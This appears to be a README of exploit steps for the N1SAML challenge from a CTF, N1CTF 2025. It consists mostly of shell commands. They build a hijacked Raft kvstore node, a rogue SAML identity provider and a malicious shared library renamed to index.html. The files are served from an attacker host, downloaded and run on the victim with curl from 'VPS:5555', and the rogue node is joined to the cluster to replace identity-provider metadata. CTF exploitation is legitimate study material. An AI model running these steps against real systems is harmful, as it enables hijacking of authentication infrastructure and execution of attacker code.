# N1SAML Exploit

> Detailed writeup: [https://exp10it.io/2025/11/breaking-raft-consensus-in-go-n1saml-writeup-for-n1ctf-2025/](https://exp10it.io/2025/11/breaking-raft-consensus-in-go-n1saml-writeup-for-n1ctf-2025/)

on attacker's machine

```bash
# build kvstore
pushd kvstore
GOOS=linux GOARCH=amd64 go build -o kvstore main.go
mv kvstore ../kvstore_hijack_amd64
popd

# build idp
pushd idp
GOOS=linux GOARCH=amd64 go build -o idp main.go
mv idp ../idp_amd64
cp idp.key ../idp.key
cp idp.crt ../idp.crt
popd

# build evil.so
docker run -v `pwd`:/build -it --platform=linux/amd64 --rm debian:bookworm-slim bash -c "apt update && apt install -y gcc && cd /build && gcc -fPIC -shared -o evil.so evil.c"

# rename evil.so to index.html
mv evil.so index.html

# host web server
simplehttpserver -listen 0.0.0.0:5555
```

on victim's machine

```bash
HOST=$(hostname -i)

# download binaries
curl http://VPS:5555/kvstore_hijack_amd64 -o kvstore_hijack
curl http://VPS:5555/idp_amd64 -o idp
curl http://VPS:5555/idp.key -o idp.key
curl http://VPS:5555/idp.crt -o idp.crt

# start idp
./idp > idp.log 2>&1 &

# save idp-metadata.xml
curl http://$HOST:9001/metadata -o idp-metadata.xml

# start kvstore
./kvstore_hijack -id evil -haddr 0.0.0.0:2333 -raddr $HOST:4444 -paddrs node1:$HOST:12380,node2:$HOST:22380,node3:$HOST:32380,evil:$HOST:4444 > kvstore.log 2>&1 &

# check the result
curl http://$HOST:2379/status
curl http://$HOST:2379/key/metadata | base64 -d
curl http://$HOST:9000/whoami -v
```
